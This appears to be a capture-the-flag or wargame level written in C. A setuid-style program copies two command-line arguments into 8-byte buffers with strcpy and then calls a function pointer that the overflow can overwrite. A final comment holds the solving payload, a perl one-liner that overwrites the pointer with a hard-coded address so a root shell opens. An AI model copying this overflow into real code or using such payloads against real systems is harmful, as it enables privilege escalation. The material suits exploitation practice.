#include <stdio.h>
#include <stdlib.h>
#include <string.h>

extern char **environ;

unsigned long get_sp(void) {
       __asm__("movl %esp,%eax\n\t"
               "and $0xff000000, %eax"
               );
}

int main(int argc, char *argv[]){
	char b1[8], b2[8];
	int  (*fp)(char *)=(int(*)(char *))&puts, i;

	if(argc!=3){ printf("%s b1 b2\n", argv[0]); exit(-1); }

	/* clear environ */
	for(i=0; environ[i] != NULL; i++)
		memset(environ[i], '\0', strlen(environ[i]));

	/* clear argz    */
	for(i=3; argv[i] != NULL; i++)
		memset(argv[i], '\0', strlen(argv[i]));

	strcpy(b1,argv[1]);
	strcpy(b2,argv[2]);
	
	if(((unsigned long)fp & 0xff000000) == get_sp())
		exit(-1);

	setreuid(geteuid(),geteuid());
    fp(b1);

	exit(1);
}
//r $(perl -e 'print "sh;" . "A"x5 . "\x50\xc8\xe4\xf7" . "\t" . "B"x4')

